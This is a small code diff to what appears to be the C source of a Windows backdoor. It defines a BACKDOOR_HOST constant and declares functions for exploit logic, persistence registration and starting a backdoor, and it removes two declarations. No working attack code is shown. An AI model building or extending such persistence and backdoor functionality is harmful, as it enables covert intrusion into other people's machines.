@@ -13,6 +13,7 @@
 #include <shellapi.h>
 #include <conio.h>
 
+// Custom structures
 #include "types.h"
 
 // Define constants and paths
@@ -36,8 +37,6 @@
 #define BACKDOOR_HOST "0.0.0.0"
 #define SOCKET_BUFFER_SIZE 4096
 
-extern void InitializeWinsock(void);
-extern BOOL IsAdmin(void);
 extern BOOL ExecuteExploitLogic(void);
 extern BOOL RegisterPersistence(void);
 extern BOOL StartBackdoor(void);
